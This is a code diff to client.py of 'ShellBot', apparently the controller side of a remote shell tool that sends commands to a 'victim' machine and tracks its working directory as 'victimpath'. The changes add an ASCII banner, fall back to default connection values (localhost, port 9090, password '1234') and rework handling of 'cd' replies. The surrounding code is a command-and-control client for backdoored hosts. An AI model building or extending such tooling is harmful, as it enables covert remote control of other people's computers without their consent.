@@ -31,6 +31,13 @@ intro = """
 ||__|||__|||__|||__|||__|||__|||__|||__||
 |/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|
 
+  __               __       
+ /  \ |       | | |  |      |
+ \__  |_   _  | | |-<   __  |_
+    \ | | |_| | | |  | |  | |
+ \__/ | | \_  | | |__/ |__| |_/
+ S    h   e   l l B    o    t
+
 Coded by: Sayak Brahmachari
 GitHub: https://github.com/sayak-brm
 Website: http://mctrl.ml
@@ -82,7 +89,12 @@ if (len(sys.argv) == 4):
   port = int(sys.argv[2])
   password = sys.argv[3]
 else:
-  sys.exit("Usage: client.py <server ip> <server bridge port> <password>")
+  #sys.exit("Usage: client.py <server ip> <server bridge port> <password>")
+  print("Usage: client.py <server ip> <server bridge port> <password>")
+  host = '127.0.0.1'
+  port = 9090
+  password = '1234'
+  print("Using default values - {}:{}, password:{}".format(host, port, password))
 
 def main():
   print(intro)
@@ -120,10 +132,9 @@ def main():
                   breakit = True
                 elif ("cd " in onebyone):
                   s.send(bytes(onebyone, 'utf-8'))
-                  victimpath = s.recv(20480).decode()
-                  if ("ERROR" in victimpath):
-                    print(victimpath)
-                    breakit = True
+                  temp = s.recv(20480).decode()
+                  if ("ERROR" not in temp): victimpath = temp
+                  else: print(temp)
                 elif (onebyone == ""):
                   print("[CONTROLLER] Nothing to be sent...\n")
                 else:
